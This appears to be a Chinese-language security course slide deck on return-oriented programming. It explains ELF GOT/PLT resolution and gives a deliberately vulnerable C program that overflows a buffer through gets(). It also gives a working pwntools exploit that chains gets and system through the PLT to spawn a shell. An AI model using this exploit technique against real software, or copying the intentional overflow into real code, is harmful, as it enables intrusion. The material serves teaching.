# ROP

廖子慶  
2017/3/14 <!-- .element: align="right" -->

---

# Premise

上次有提到 DEP 保護  
既然不能 run 自己的 shellcode  
就用原有的 code 湊成目的吧!

---

# Function call

Dynamic link ELF

1. GOT
1. PLT

--

# GOT

- 俗稱 GOT Table
- ELF 內的一段 data(rw)
- pwntool 可以用 elf.got['foo']來找出 fuction foo 在 table 的位置
- 對應 function 在 libc 裡的位置
- 會在第一次 call function 時填入值

| function | address    | content    |
| -------- | ---------- | ---------- |
| gets     | 0x0804a00c | 0xf6681810 |
| strcpy   | 0x0804a010 | 0xf66a8410 |

--

# PLT

- ELF 內的一段 code(rx)
- pwntool 可以用 elf.plt['foo']來找出這段 code 的位置
- 作用是跳到相對 got 上的位置

| function | address    | content           |
| -------- | ---------- | ----------------- |
| gets     | 0x08048300 | jmp got['gets']   |
| strcpy   | 0x08048310 | jmp got['strcpy'] |

--

# Function call SOP

ex: call printf

1. 跳到 elf.plt['printf']
1. 如果 elf.got['printf']有值
   1. 跳到 elf.got['printf']上填得值
   1. 執行 libc 上的 printf
1. 如果 elf.got['printf']沒有值
   1. 跳到 dl_resolver 上
   1. dl_resolver 會填上 got 的值
   1. 跳到 elf.got['printf']上填得值
   1. 執行 libc 上的 printf

--

# Conclusion

- 將 EIP 控到 plt['foo']或是[got['foo']]就能 call foo
- foo 身為一個 callee
- foo 會以為 stack 上第一個(ESP)是 return address
- foo 會以為 stack 上第二個(ESP+4)之後是 argument

---

# Function ROP

```c
#include <stdio.h>
#include <stdlib.h>
void vul(){
    char buf[4];
    gets(buf);
    return;
}
int main(int argc, char *argv[])
{
    system("cal");
    vul();
    return 0;
}
```

```shell
gcc -m32 -fno-stack-protector -o ./demo ./demo.c
```

[demo](https://drive.google.com/open?id=0B5w3KuqR3zoBUkc5VFJqUHZ0cjA)

--

# Pwn it

```python
from pwn import *
io=process("./demo")
elf=ELF("./demo")

padding=16 # same as before
bss=elf.bss()+0x100 # bss is a data segment which final part don't affect anything
system=elf.plt['system'] # system plt address
gets=elf.plt['gets'] # gets plt address

payload='A'*padding
payload+=flat(gets,system,bss,bss) # flat is a iterator same as "".join(map(p32,[]))

io.sendline(payload) # send the payload
io.sendline("sh") # send the command to bss
io.interactive()
```

--

# Trace it

- EIP=>gets
- ESP=>system->bss->bss
- return address=>system
- argument=>bss

1. gets(bss);
1. return to system!

--

- EIP=>system
- ESP=>bss->bss
- return address=>bss (not important)
- argument=>bss

1. system(bss);
1. return to bss(crash)

---

#Q & A

--

#END
